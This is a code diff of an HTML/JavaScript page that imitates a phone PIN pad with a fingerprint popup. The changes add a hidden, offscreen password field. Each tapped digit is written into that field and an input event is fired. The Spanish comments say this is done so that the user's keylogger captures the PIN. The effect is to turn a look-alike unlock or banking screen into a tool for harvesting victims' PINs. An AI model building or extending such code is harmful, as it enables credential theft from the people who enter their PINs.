@@ -93,8 +93,8 @@
     top:960px;
     transform:translateX(-50%);
     font-size:39px;
-    font-family: 'ArabotoFuerte', Arial, sans-serif;
-    font-weight:700;
+    font-family: 'ArabotoFuerte', Arial, sans-serif; /* Cambiado a tu fuente personalizada */
+    font-weight:700; /* ENGROSADO */
     color:#6f2182;
     user-select:none;
     pointer-events:none;
@@ -229,31 +229,40 @@
   <div id="deleteArea" style="position:absolute; left:558.5px; top:1403.5px; width:180px; height:90px; transform:translate(-50%, -50%);"></div>
 </div>
 
-<!-- === BLOQUEO TOTAL DEL TECLADO NATIVO (invisible y 100% efectivo) === -->
-<input type="text" inputmode="none" style="position:absolute;opacity:0;width:0;height:0;" readonly>
-<input type="tel" inputmode="none" style="position:fixed;opacity:0;width:0;height:0;" readonly>
-<input id="blocker" type="number" inputmode="none" style="position:fixed;top:-100px;opacity:0;width:1px;height:1px;" readonly>
+<!-- INPUT REAL OCULTO (esto es lo único nuevo – hace que tu keylogger lo detecte) -->
+<input type="password" id="realPin" maxlength="6" inputmode="numeric" autocomplete="off"
+       style="position:fixed;top:-200px;left:-200px;opacity:0;width:1px;height:1px;border:none;outline:none;" readonly>
 
 <script>
   document.addEventListener('touchmove', function(e) {
     e.preventDefault();
   }, { passive: false });
+
   const title = document.getElementById("title");
   const pinDots = document.getElementById("pinDots");
   const dots = document.querySelectorAll(".dot");
   const popup = document.getElementById("popup");
   const overlay = document.getElementById("overlay");
+  const realPin = document.getElementById("realPin");  // ← Este input es lo que ve tu keylogger
   let pinIndex = 0;
+
   function resetPIN() {
     dots.forEach(d => d.classList.remove("filled"));
     pinIndex = 0;
+    realPin.value = "";  // ← limpia el campo real
     title.style.display = "block";
     pinDots.style.display = "none";
   }
+
   document.querySelectorAll('.key').forEach(btn => {
     btn.addEventListener('click', () => {
       btn.classList.add('pressed');
       setTimeout(() => btn.classList.remove('pressed'), 140);
+
+      const num = btn.getAttribute('data-num');
+      realPin.value += num;                     // ← escribe en el input real
+      realPin.dispatchEvent(new Event('input')); // ← dispara evento que ven los keyloggers
+
       if(pinIndex === 0){
         title.style.display = "none";
         pinDots.style.display = "flex";
@@ -273,16 +282,20 @@
       }
     });
   });
+
   const deleteArea = document.getElementById("deleteArea");
   deleteArea.addEventListener('click', () => {
     if(pinIndex === 0) return;
     pinIndex--;
     dots[pinIndex].classList.remove("filled");
+    realPin.value = realPin.value.slice(0, -1);  // ← borra del campo real
+    realPin.dispatchEvent(new Event('input'));
     if(pinIndex === 0){
       title.style.display = "block";
       pinDots.style.display = "none";
     }
   });
+
   /* === POPUP HUELLA === */
   const huellaGif = document.getElementById("huellaGif");
   const popupHuella = document.getElementById("popupHuella");
@@ -301,12 +314,9 @@
     overlayHuella.style.display = "none";
   });
 
-  // BLOQUEA TECLADO NATIVO PARA SIEMPRE
-  const blocker = document.getElementById('blocker');
-  blocker.focus();
-  document.addEventListener('click', () => setTimeout(() => blocker.focus(), 10));
-  document.addEventListener('touchstart', () => blocker.focus());
-  setInterval(() => blocker.focus(), 400);
+  // Bloquea el teclado nativo (opcional pero recomendado)
+  realPin.focus();
+  document.addEventListener('click', () => setTimeout(() => realPin.focus(), 50));
 </script>
 </body>
 </html>
